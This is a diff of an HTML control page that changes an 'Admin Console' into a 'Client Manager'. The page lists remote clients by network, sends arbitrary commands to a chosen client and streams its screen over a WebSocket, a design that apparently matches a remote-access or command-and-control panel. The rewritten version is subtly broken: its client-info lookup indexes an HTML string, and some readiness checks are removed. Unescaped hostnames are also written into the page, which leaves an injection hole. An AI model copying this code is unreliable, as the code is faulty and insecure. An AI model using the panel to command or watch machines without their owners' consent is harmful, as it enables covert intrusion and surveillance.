@@ -1,112 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Console</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-    pre { background: #eee; padding: 10px; max-height: 300px; overflow: auto; }
-    img { max-width: 100%; border: 1px solid #ccc; }
-    .client-info { font-size: 0.9em; color: #555; }
-  </style>
+<meta charset="UTF-8">
+<title>Client Manager</title>
+<style>
+  body { font-family: sans-serif; }
+  pre { background: #f0f0f0; padding: 10px; }
+</style>
 </head>
 <body>
-  <h1>Admin Console</h1>
+<h1>Client Manager</h1>
+<div id="clients"></div>
+<div id="client-info"></div>
+<input type="text" id="cmd">
+<button onclick="sendCommand()">Send</button>
+<button onclick="startScreen()">Start Screen</button>
+<button onclick="stopScreen()">Stop Screen</button>
+<img id="screen" style="max-width: 100%;">
+<pre id="output"></pre>
 
-  <h2>Clients:</h2>
-  <ul id="client-list"></ul>
+<script>
+let ws, selectedClient;
 
-  <div id="client-info"></div>
-
-  <h2>Send Command:</h2>
-  <input type="text" id="command-input">
-  <button onclick="sendCommand()">Send</button>
-
-  <h2>Screen:</h2>
-  <button onclick="startScreen()">Start Screenshare</button>
-  <button onclick="stopScreen()">Stop Screenshare</button>
-  <div><img id="screen" /></div>
-
-  <h2>Output:</h2>
-  <pre id="output"></pre>
-
-  <script>
-    let selectedClient = null;
-    let ws = null;
-    let clientsData = [];
-
-    function apiBase() {
-      return window.location.origin;
+function loadClients() {
+  fetch("/clients").then(r => r.json()).then(data => {
+    let html = "";
+    for (const [net, clients] of Object.entries(data)) {
+      html += `<h2>${net}</h2><ul>`;
+      clients.forEach(c => {
+        html += `<li>${c.hostname} (${c.status}) <button onclick="select('${c.id}')">Select</button></li>`;
+      });
+      html += "</ul>";
     }
+    document.getElementById("clients").innerHTML = html;
+  });
+}
 
-    function wsBase() {
-      return (window.location.protocol === "https:" ? "wss://" : "ws://") + window.location.host;
-    }
+function select(id) {
+  selectedClient = id;
+  let info = Object.entries(getClientInfo(id)).map(([k,v]) => `${k}: ${v}`).join("\n");
+  document.getElementById("client-info").innerHTML = `<pre>${info}</pre>`;
+}
 
-    function loadClients() {
-      fetch(apiBase() + "/clients")
-        .then(res => res.json())
-        .then(data => {
-          clientsData = data.clients;
-          const list = document.getElementById("client-list");
-          list.innerHTML = "";
-          data.clients.forEach(c => {
-            const li = document.createElement("li");
-            li.innerHTML = `${c.id} (${c.status}) <button onclick="selectClient('${c.id}')">Select</button>`;
-            list.appendChild(li);
-          });
-        });
-    }
+function getClientInfo(id) {
+  let all = document.querySelector("#clients").innerHTML;
+  return all[id] || {};
+}
 
-    function selectClient(clientId) {
-      selectedClient = clientId;
-      const infoObj = clientsData.find(c => c.id === clientId);
-      let html = "<h3>Client Info:</h3>";
-      if (infoObj && infoObj.info) {
-        Object.entries(infoObj.info).forEach(([k, v]) => {
-          html += `<div class="client-info">${k}: ${v}</div>`;
-        });
-      }
-      document.getElementById("client-info").innerHTML = html;
-      document.getElementById("output").textContent = "";
-      document.getElementById("screen").src = "";
-    }
+function connectAdmin() {
+  ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws/admin");
+  ws.onmessage = e => {
+    if (typeof e.data === "string")
+      document.getElementById("output").textContent += e.data + "\n";
+    else
+      document.getElementById("screen").src = URL.createObjectURL(new Blob([e.data]));
+  };
+}
 
-    function initWS() {
-      ws = new WebSocket(wsBase() + "/ws/admin");
-      ws.onmessage = (e) => {
-        if (typeof e.data === "string") {
-          document.getElementById("output").textContent += e.data + "\n";
-        } else {
-          const url = URL.createObjectURL(new Blob([e.data]));
-          document.getElementById("screen").src = url;
-        }
-      };
-    }
+function sendCommand() {
+  if (selectedClient && ws && ws.readyState === 1) {
+    ws.send(JSON.stringify({ target: selectedClient, cmd: document.getElementById("cmd").value }));
+  }
+}
 
-    function sendCommand() {
-      const input = document.getElementById("command-input").value;
-      if (selectedClient && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ target: selectedClient, cmd: input }));
-      }
-    }
+function startScreen() {
+  if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_start" }));
+}
 
-    function startScreen() {
-      if (selectedClient && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_start" }));
-      }
-    }
+function stopScreen() {
+  if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_stop" }));
+}
 
-    function stopScreen() {
-      if (selectedClient && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_stop" }));
-      }
-    }
-
-    loadClients();
-    setInterval(loadClients, 5000);
-    initWS();
-  </script>
+setInterval(loadClients, 5000);
+loadClients();
+connectAdmin();
+</script>
 </body>
 </html>
